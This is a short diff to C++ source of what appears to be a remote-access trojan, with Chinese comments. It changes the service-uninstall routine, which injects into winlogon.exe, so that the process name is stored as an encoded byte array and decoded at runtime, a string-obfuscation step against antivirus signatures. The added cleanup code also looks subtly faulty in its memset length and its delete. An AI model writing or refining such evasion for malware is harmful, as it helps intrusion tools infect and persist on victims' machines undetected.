@@ -143,9 +143,14 @@ void CKernelManager::UnInstallService()
 	lstrcat(strRecordFile, "\\syslog.dat");
 	DeleteFile(strRecordFile);
 	
+	char winlogon[] = { 0x0c,0xbc,0xa3,0xa7,0xa4,0xa8,0xa1,0xaa,0xaa,0xed,0xa7,0xb9,0xa5 };	//winlogon.exe
+	char* winlogon_exe = decodeStr(winlogon);					//解密函数
+
+
+
 	if (m_dwServiceType != 0x120)  // owner的远程删除，不能自己停止自己删除,远程线程删除
 	{
-		InjectRemoveService("winlogon.exe", m_strServiceName);
+		InjectRemoveService(winlogon_exe, m_strServiceName);
 	}
 	else // shared进程的服务,可以删除自己
 	{
@@ -153,6 +158,8 @@ void CKernelManager::UnInstallService()
 	}
 	// 所有操作完成后，通知主线程可以退出
 	CreateEvent(NULL, true, false, m_strKillEvent);
+	memset(winlogon_exe, 0, winlogon[STR_CRY_LENGTH]);					//填充0
+	delete winlogon_exe;
 }
 
 bool CKernelManager::IsActived()
